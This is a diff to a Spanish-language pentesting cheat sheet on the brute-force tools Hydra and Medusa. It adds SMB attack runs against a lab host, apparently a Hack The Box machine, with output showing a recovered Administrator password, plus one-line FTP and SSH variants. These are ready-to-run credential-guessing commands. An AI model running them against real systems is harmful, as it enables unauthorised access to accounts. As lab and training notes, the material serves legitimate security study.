@@ -3,7 +3,7 @@
 ___
 **Hydra.-** es una herramienta de prueba de penetración (pentesting) que se utiliza para realizar ataques de fuerza bruta a sistemas de autenticación. Es una herramienta de línea de comandos que permite automatizar el proceso de adivinación de contraseñas para varios protocolos de autenticación, incluyendo FTP, SSH, Telnet, HTTP, HTTPS, entre otros.
 
-### POST-FORM
+### HTTP POST-FORM
 #### Ejecución
 ``` java
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
@@ -50,6 +50,29 @@ Este comando usa la herramienta Hydra para realizar un ataque de fuerza bruta en
 >* **"-L user.txt".-** especifica la ruta del archivo que contiene los nombres de usuario que se utilizarán para el ataque de fuerza bruta.
 >* **"-P /usr/share/wordlists/rockyou.txt".-** especifica la ruta de la lista de contraseñas que se utilizará para el ataque de fuerza bruta. En este caso, se utiliza la popular lista de 
 
+### HYDRA SMB
+
+```java
+┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
+└─# hydra -l Administrator -p 'P@ssw0rd' smb://192.168.200.155
+Hydra v9.4 (c) 2022 by van HARRIS Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway New).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-24 14:42:10
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking smb://192.168.200.155:445/
+[445][smb] host: 192.168.200.155   login: Administrator   password: P@ssw0rd 
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-24 14:42:11
+
+```
+
+si fuera ftp `hydra -l usuario -P contraseñas.txt ftp://192.168.1.100`
+
+si fuera ssh `hydra -l usuario -P contraseñas.txt ssh://192.168.1.100`
+
+
+
 ## MEDUSA
 ___
 **Medusa.-** es una herramienta de prueba de penetración que se utiliza para realizar ataques de fuerza bruta contra sistemas y aplicaciones. Su función principal es intentar adivinar credenciales de inicio de sesión, como nombres de usuario y contraseñas, mediante la repetición de pruebas con diferentes combinaciones de credenciales.
@@ -67,3 +90,17 @@ Es importante tener en cuenta que Medusa debe ser utilizado únicamente con fine
 >* -e: Este flag indica que se deben utilizar contraseñas vacías en el ataque.
 >* -B: Este flag indica que se deben utilizar técnicas de ataque especiales, como ataque de diccionario personalizado, fuerza bruta por intervalo de tiempo, etc.
 >* -C: Este flag indica que se deben utilizar diferentes códigos de respuesta del servidor para identificar si una prueba de credenciales ha sido exitosa o no.
+
+
+### SMB 
+```java
+┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
+└─# medusa -u Administrator -p 'P@ssw0rd' -h 192.168.200.155 -M smbnt
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun-bh / Foofus Networks <jmk@foofus.tst.net>
+
+ACCOUNT CHECK: [smbnt] Host: 192.168.200.155 (1 of 1, 0 complete) User: Administrator (1 of 1, 0 complete) Password: P@ssw0rd (1 of 1 complete)
+ACCOUNT FOUND: [smbnt] Host: 192.168.200.155 User: Administrator Password: P@ssw0rd [SUCCESS (ADMIN$ - Access Allowed)]
+```
+El mismo ejemplo se puede usar para FTP `medusa -u usuario -P contraseñas.txt -h 192.168.1.100 -M ftp`
+
+El mismo ejemplo se puede usar para `medusa -u usuario -P contraseñas.txt -h 192.168.1.100 -M ssh`
